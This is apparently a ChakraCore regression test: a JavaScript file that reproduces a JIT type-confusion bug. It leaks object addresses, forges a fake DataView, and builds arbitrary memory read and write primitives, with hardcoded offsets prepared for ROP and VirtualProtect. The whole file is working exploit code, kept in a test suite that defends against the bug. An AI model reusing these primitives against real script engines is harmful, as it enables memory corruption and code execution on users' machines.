//-------------------------------------------------------------------------------------------------------
// Copyright (C) Microsoft Corporation and contributors. All rights reserved.
// Licensed under the MIT license. See LICENSE.txt file in the project root for full license information.
//-------------------------------------------------------------------------------------------------------
var evil_array = new Array(0x38/*dataview type id*/, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
	g_lo = 0;
	g_hi = 0;
	var b = [1.1,2.2];
	dv = new DataView(new ArrayBuffer(8));
	
	var vt_to_chakrabase = 0x592d88;
	var chakrabase_to_threadCtxPtr = 0x735eb0;
	var chakrabase_to_retPtr = 0x1ca99d;
	var chakrabase_to_rop = 0x1028e5;
	var chakrabase_to_vp = 0x1028bb;
	
	function read_obj_address(a,gg,c,d){
		a[0] = 1.2;
		try{gg[d] = c} catch(e) {}
		a[1] = 2.2;
		return a[0];
	}
	
	function float_to_uint(num){
		f = new Float64Array(1);
		f[0] = num;
		uint = new Uint32Array(f.buffer);
		return uint[1] * 0x100000000 + uint[0];
	}
	function uint_to_float(lo,hi){
		u = new Uint32Array(2);
		u[0] = lo;
		u[1] = hi;
		g_lo = u[0];
		g_hi = u[1];
		f = new Float64Array(u.buffer);
		return f[0];
	}
	function fake_dataview(lo,hi){
		int_lo  = lo > 0x80000000? -(0x100000000-lo):lo;
		evil_array[0] = 0x38;
		evil_array[1] = 0;
	
		evil_array[2] = int_lo;
		evil_array[3] = hi;
		
		evil_array[4] = 0;
		evil_array[5] = 0;
		evil_array[6] = 0;
		evil_array[7] = 0;
		
		evil_array[8] = 0x200;
		
		evil_array[9] = 0;
		
		evil_array[10] = int_lo - 0x38;
		evil_array[11] = hi;
		
		evil_array[12] = 0;
		evil_array[13] = 0;
		
		//alert(evil_array[8].toString(16))
		evil_array[14] = 0x41414141;
		evil_array[15] = 0x42424242;
		//Array.prototype.slice.call(evil_array);
	}
	function Read32(addr){
		evil_array[14] = addr & 0xffffffff;
		evil_array[15] = Math.floor(addr / 0x100000000);
		return dv.getUint32.call(evil_dv,0,true);
	}
	function Write32(addr,data){
		evil_array[14] = addr & 0xffffffff;
		evil_array[15] = Math.floor(addr / 0x100000000);
		dv.setUint32.call(evil_dv,0,data,true);
	}
	function Read64(addr){
		evil_array[14] = addr & 0xffffffff;
		evil_array[15] = Math.floor(addr / 0x100000000);
		result = dv.getUint32.call(evil_dv,0,true) + dv.getUint32.call(evil_dv,4,true) * 0x100000000;
		return result;
	}
	function Write64(addr,data_lo,data_hi){
		evil_array[14] = addr & 0xffffffff;
		evil_array[15] = Math.floor(addr / 0x100000000);
		dv.setUint32.call(evil_dv,0,data_lo,true);
		dv.setUint32.call(evil_dv,4,data_hi,true);
	}
	function main(){
		var a =[1.1,2.2];
		var gg = new Float64Array(100);
		for(var i = 0;i < 0x10000;i++){
			read_obj_address(a,gg,1.1+i,4);
		}
		evil = {valueOf: () => {
				a[0] = evil_array;    //leak any object address
				return 0;
				}}
		
		evil_array_slots_address = float_to_uint(read_obj_address(a,gg,evil,4))+0x58;
		
		var fake_obj_address = uint_to_float(evil_array_slots_address & 0xffffffff,Math.floor(evil_array_slots_address / 0x100000000)).toString();
		var fake_obj_str = "function fake_obj(b,gg,c,d){b[0] = 1.333;try{gg[d] = c} catch(e) {};b[1] = 2.22222222;b[0] = " + fake_obj_address +";}";
		eval(fake_obj_str);
		
		
		for(var i = 0;i < 0x10000;i++){
			fake_obj(b,gg,1.1+i,4);
		}
		evil2 = {valueOf: () => {
				b[0] = {};
				return 0;
				}}
		fake_dataview(g_lo,g_hi);
		fake_obj(b,gg,evil2,4);
		evil_dv = b[0];
	}
	main();

        WScript.Echo('pass');